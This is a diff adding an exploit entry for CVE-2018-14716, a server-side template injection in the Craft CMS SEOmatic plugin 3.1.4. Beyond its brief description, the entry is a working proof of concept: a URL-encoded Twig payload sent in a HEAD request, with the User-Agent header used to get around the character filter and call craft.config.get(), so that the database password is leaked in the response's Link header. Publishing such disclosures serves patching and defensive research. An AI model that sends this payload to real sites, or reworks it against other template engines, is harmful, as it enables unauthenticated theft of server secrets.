@@ -1,0 +1,35 @@
+# Exploit Title: Craft CMS SEOmatic plugin 3.1.4 - Server-Side Template Injection
+# Date: 2018-07-20
+# Software Link: https://github.com/nystudio107/craft-seomatic
+# Exploit Author: Sebastian Kriesten (0xB455)
+# Contact: https://twitter.com/0xB455
+# CVE: CVE-2018-14716
+# Category: webapps
+
+# 1. Description
+# An unauthenticated user can trigger the Twig template engine by injecting 
+# code into the URI as described in this article:
+
+# http://ha.cker.info/exploitation-of-server-side-template-injection-with-craft-cms-plguin-seomatic/
+# This can be leveraged to perform arbitrary calls against the template engine and the CMS.
+# The output will be reflected within the Link header of the response.
+
+# 2. Proof of Concept
+# The injection can be performed against any part of the URL path. However as the framework is replacing 
+# control characters with HTML entities (e.g. ' ==> &#039;) it is not possible to directly address methods with
+# parameter values. Therefor it is required to bypass the filter by invoking functions such as craft.request.getUserAgent()
+# and store the parameter values in the User-Agent header. In combination with Twig's slice() filter it is then possible
+# to extract sensitive information by utilizing the craft.config.get() method:
+
+# Request:
+HEAD /db-password:%20%7b%25%20set%20dummy%20=%20craft.request.getUserAgent()|slice(0,8)%25%7d%7b%25%20set%20dummy2%20=%20craft.request.getUserAgent()|slice(9,2)%25%7d%7b%7bcraft.config.get(dummy,dummy2)%7d%7d HTTP/1.1
+Host: craft-installation
+User-Agent: password db
+
+# Response:
+HTTP/1.1 404 Not Found
+Server: nginx
+…
+
+Link: <db-password: SECRET>; rel='canonical'
+…
